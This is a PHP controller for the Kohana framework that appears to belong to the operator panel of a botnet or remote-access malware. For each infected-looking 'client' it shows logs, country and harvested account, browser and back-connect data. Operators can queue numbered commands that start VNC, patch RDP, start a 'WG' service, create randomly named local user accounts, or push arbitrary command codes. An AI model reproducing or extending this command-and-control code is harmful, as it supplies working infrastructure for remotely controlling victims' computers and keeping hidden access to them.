<?php defined('SYSPATH') or die('No direct script access.');

class Controller_Log extends Controller_Template{
    public $template = 'v_main';

    public function before(){
        $auth = Auth::instance();

        if($auth->logged_in() && Helper::checkActionInRole('Logs')){
            return parent::before();
        }else{
            HTTP::redirect('/login/index');
        }
    }

    private static function addCommand($array, $client_id, $redirect = true){
        DB::insert('commands', array_keys($array))->values($array)->execute();

        if($redirect){
            HTTP::redirect('/log/'.$client_id);
        }
    }

	public function action_index(){
        ini_set('memory_limit', '-1');

        if(isset($_POST['hideEmptyFields']) && !Session::instance()->get('hideEmptyFields')){
            Session::instance()->set('hideEmptyFields', true);
        }elseif(isset($_POST['hideEmptyFields']) && Session::instance()->get('hideEmptyFields')){
            Session::instance()->set('hideEmptyFields', false);
        }

        $client_id = $this->request->param('id');
        if ( null === $client_id ) {
            throw HTTP_Exception::factory(404);
        }

        $client = ORM::factory('Client', ['id' => $client_id]);
        if ( ! $client->loaded() ) {
            throw HTTP_Exception::factory(404);
        }

        $user = Auth::instance()->get_user();

        $alpha_country = Kohana::$config->load('country')->as_array();
        $client->country = isset($alpha_country[$client->country]) ? $alpha_country[$client->country] : $client->country;

        $client_net = ORM::factory('Client', ['id' => $client_id])->group;
        $file_path_net_access = Kohana::find_file('net_access', Auth::instance()->get_user()->id, 'json');
        if($file_path_net_access){
            $net_list = json_decode(
                file_get_contents($file_path_net_access)
            );
            if(!in_array($client_net, $net_list)){
                HTTP::redirect('/');
            }
        }

        // Due to bug in postgresql we can't use ORM to get client logs
        $queryClientLogs = DB::select()
            ->from($client->logs->table_name())
            ->where('client_id', '=', $client->id);
        $queryCountClientLogs = clone $queryClientLogs;
        $countClientLogs = $queryCountClientLogs->select([DB::expr('COUNT(*)'), 'count'])
            ->execute()
            ->get('count');
        $queryClientLogs->select('created_at', 'info', 'type', 'command')
            ->order_by('created_at', 'DESC');
        $pagination = Pagination::factory(['total_items' => $countClientLogs]);
        $pagination->items_per_page = 10;
        $log = DB::select()
            ->from([$queryClientLogs, 'log'])
            ->order_by('created_at', 'DESC')
            ->limit($pagination->items_per_page)
            ->offset($pagination->offset)
            ->execute()
            ->as_array();

        $actions = ORM::factory('Action')->find_all();

        if(isset($_POST['vars'])){
            $vars = ORM::factory('Var')
                ->getClientVars($client_id, true);
        }else{
            $vars = ORM::factory('Var')
                ->getClientVars($client_id, false);
        }

        $commands = ORM::factory('Command')
            ->where('client_id', '=', $client_id)
            ->and_where('result_code', 'IS', NULL)
            ->find_all();

        $servers = ORM::factory('Server')->find_all();
        $isAllowedToWorkWithCommands = Helper::checkActionInRole('Commands');

        if ($isAllowedToWorkWithCommands) {
            /* DELETE COMMANDS */
            if( isset($_POST['delete-command']) && isset($_POST['id-delete-commands']) ){
                foreach($_POST['id-delete-commands'] as $i){
                    DB::delete('commands')->where('id', '=', $i)->execute();
                }
                HTTP::redirect('/log/'.$client_id);
            }

            /* ADD COMMAND (PUSH BACK) */
            if( isset($_POST['create']) ){
                $data = Arr::extract($_POST, ['incode', 'params']);
                $data['client_id'] = $client_id;
                ORM::factory('Userslogs')
                    ->createLog2(
                        "&laquo;Push Back&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>",
                        $data
                    );
                self::addCommand($data, $client_id);
            }
            /* VNC */
            if( isset($_POST['VNC']) ){
                ORM::factory('Userslogs')->createLog("push &laquo;VNC&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 58,
                    'params' => "bccfg",
                ], $client_id, false);

                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 57,
                    'params' => "0000",
                ], $client_id);
            }
            /* RDP patch */
            if( isset($_POST['RDP-patch']) )
            {
                ORM::factory('Userslogs')->createLog("push &laquo;RDP patch&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 55,
                    'params' => "00000",
                ], $client_id);
            }
            /* Start WG */
            if( isset($_POST['Start-WG']) )
            {
                ORM::factory('Userslogs')->createLog("push &laquo;Start WG&raquo; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 61,
                    'params' => "00000",
                ], $client_id);
            }
            /* Create user */
            if (isset($_POST['CreateUser'])) {
                $userName = 'user' . rand(100, 999);
                ORM::factory('Userslogs')->createLog("push &laquo;Create user&raquo; user name &quot;" . $userName . "&quot; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 32,
                    'params' => $userName,
                ], $client_id, false);
                $comment = $client->comment->value;
                if ( ! empty($comment)) {
                    $comment .= "\n";
                }
                $comment .= "pushed 32, user name " . $userName;
                Model_Client_Comment::upsertComment($client, $comment);
                HTTP::redirect('/log/'.$client_id);
            }
            /* Create user (adv) */
            if (isset($_POST['CreateUserAdv'])) {
                $userName = 'user' . rand(100, 999);
                ORM::factory('Userslogs')->createLog("push &laquo;Create user (adv)&raquo; user name &quot;" . $userName . "&quot; in client <a href='/log/".$client_id."'>".$client_id."</a>");
                self::addCommand([
                    'client_id' => $client->id,
                    'incode' => 31,
                    'params' => $userName,
                ], $client_id, false);
                $comment = $client->comments->value;
                if ( ! empty($comment)) {
                    $comment .= "\n";
                }
                $comment .= "pushed 31, user name " . $userName;
                Model_Client_Comment::upsertComment($client, $comment);
                HTTP::redirect('/log/'.$client_id);
            }
        }


        /* Comment */
        if ( Request::POST == $this->request->method() && null !== $this->request->post('update-comment') ){
            $comment = $this->request->post('comment');
            Model_Client_Comment::upsertComment($client, $comment, $user->id);
        }

        $comments;
        $received_comments =  Model_Client_Comment::getComments($client_id, $user->id);
        if ( $received_comments == false ) {
          $comments = [ 'user_id' => '', 'comment_text' => '', ]; }
        else {
          $comments = $received_comments; }

        $this->template->content = BladeView::factory("log/index")
            ->bind('log', $log)
            ->bind('pagination', $pagination)
            ->bind('dataaccount', $dataaccount)
            ->bind('vars', $vars)
            ->bind('databrowser', $databrowser)
            ->bind('backconndata', $backconndata)
            ->bind('commands', $commands)
            ->bind('isAllowedToWorkWithCommands', $isAllowedToWorkWithCommands)
            ->bind('client', $client)
            ->bind('comments', $comments)
            ->bind('link', $link)
            ->bind('servers', $servers)
            ->bind('columns', $columns);
        $this->template->navbar = BladeView::factory('navbar')
            ->bind('user', $user)
            ->bind('actions', $actions);
    }
}
